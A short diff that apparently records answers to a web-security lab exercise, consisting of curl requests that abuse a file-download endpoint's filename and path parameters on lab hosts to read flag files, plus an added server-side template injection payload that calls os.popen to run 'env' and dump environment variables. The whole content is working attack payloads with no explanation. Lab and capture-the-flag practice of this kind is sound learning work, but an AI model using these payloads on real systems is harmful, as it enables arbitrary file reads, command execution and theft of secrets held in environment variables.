@@ -1,3 +1,4 @@
 curl 'http://web0x07.hbtn/task0/download_file?filename=0-flag.txt&path=/etc'
 curl 'http://web0x07.hbtn/task1/download_file?filename=1-flag.txt&path=/tmp/secure_storage'
 curl 'http://web0x07.hbtn/task2/download_file?filename=2-flag.txt&path=YWJjMTIzX3NlY3JldF9wYXRoX3RvX2ZsYWc='
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('env').read() }}
